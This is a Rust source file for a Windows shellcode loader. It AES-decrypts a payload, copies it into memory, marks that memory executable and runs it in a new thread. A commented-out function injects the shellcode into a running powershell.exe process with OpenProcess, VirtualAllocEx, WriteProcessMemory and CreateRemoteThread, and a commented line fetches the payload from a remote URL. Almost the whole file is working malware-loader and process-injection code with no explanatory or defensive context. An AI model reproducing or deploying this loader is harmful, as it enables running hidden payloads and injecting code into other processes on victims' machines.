use sysinfo::System;
use windows::Win32::{System::{Memory::{VirtualAllocEx, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READ, VirtualAlloc, PAGE_READWRITE, VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS}, Threading::{OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, CreateRemoteThread, WaitForSingleObject, CreateThread, THREAD_CREATION_FLAGS}, Diagnostics::Debug::WriteProcessMemory}, Foundation::CloseHandle};
use windows::Win32::Foundation::HANDLE;
use aes::cipher::block_padding::Pkcs7;
use aes::cipher::{KeyIvInit, BlockDecryptMut};
use core::ffi::c_void;
use core::ptr;
use std::ptr::null;

fn decrypt(buf: &mut Vec<u8>) {
    let key : [u8;16] = [];
    let iv : [u8;16] = [];

    type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

    Aes128CbcDec::new(&key.into(), &iv.into()).decrypt_padded_mut::<Pkcs7>(buf.as_mut_slice()).unwrap();
}


fn find_proc(name: &str) -> u32 {
    let mut sys: System = System::new_all();

    sys.refresh_all();

    let mut pid: u32 = 0;

    for (proc_id, process) in sys.processes() {
        if process.name().to_lowercase() == name {
            pid = proc_id.as_u32();
            break;
        }
    }
    return pid;
}

fn get_data() -> Result<Vec<u8>, reqwest::Error> {
    // let resp = reqwest::blocking::get("http://test.com/payload.txt")?.bytes()?;

    let resp: Vec<u8> = vec![]; //include_bytes!("payload.txt").to_owned().to_vec();

    return Ok(resp);
}

fn self_inject() {
    let mut sc: Vec<u8> = get_data().unwrap();
    let sc_len: usize = sc.len();

    unsafe {
        println!("[+] Allocating memory");
        let exec_mem: *mut c_void = VirtualAlloc(
            Some(ptr::null()),
            sc_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        println!("[+] Decrypting");
        decrypt(&mut sc);
        println!("[+] Copying {sc_len} bytes into memory");
        std::ptr::copy(sc.as_mut_ptr(), exec_mem as *mut u8, sc_len);

        println!("[+] Making mem executable");
        let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
        VirtualProtect(
            exec_mem,
            sc_len,
            PAGE_EXECUTE_READ,
            &mut old_protect
        ).unwrap();

        let e_mem: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(exec_mem) };

        println!("[+] Creating thread");
        let h_thread: HANDLE = CreateThread(
            Some(ptr::null_mut()),
            0,
            Some(e_mem),
            Some(null()),
            THREAD_CREATION_FLAGS::default(),
            Some(ptr::null_mut())
        ).unwrap();

        println!("[+] Executing thread");
        WaitForSingleObject(h_thread, u32::MAX);
    }
}

// fn remote_inject() {
//     let mut sc: Vec<u8> = get_data().unwrap();
//     let sc_len: usize = sc.len();

//     let proc: &str = "powershell.exe";

//     println!("[+] Finding process: {}", proc);
//     let pid: u32 = find_proc(&proc);

//     if pid == 0 {
//        panic!("[!] Process not found!"); 
//     }
//     unsafe {
//         println!("[+] Opening handle to process");
//         let h_proc: HANDLE = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
//             PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
//             false,
//             pid).expect("Could not open process");

//         println!("[+] Allocating memory");
//         let exec_mem: *mut c_void = VirtualAllocEx(
//             h_proc,
//             Some(ptr::null()),
//             sc_len,
//             MEM_COMMIT | MEM_RESERVE,
//             PAGE_EXECUTE_READ
//         );

//         decrypt(&mut sc);
//         println!("[+] Copying {sc_len} bytes into memory");
//         let num_written: *mut usize = ptr::null_mut();
//         WriteProcessMemory(
//             h_proc,
//             exec_mem,
//             sc.as_mut_ptr() as *mut c_void,
//             sc_len,
//             Some(num_written)
//         ).unwrap();

//         let e_mem: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(exec_mem) };

//         println!("[+] Creating thread");
//         let h_thread: HANDLE = CreateRemoteThread(
//             h_proc,
//             Some(ptr::null_mut()),
//             0,
//             Some(e_mem),
//             Some(null()),
//             0,
//             Some(ptr::null_mut())
//         ).unwrap();

//         println!("[+] Executing thread");
//         WaitForSingleObject(h_thread, u32::MAX);
//     }
// }

fn main() {

    self_inject();

    //remote_inject();
}
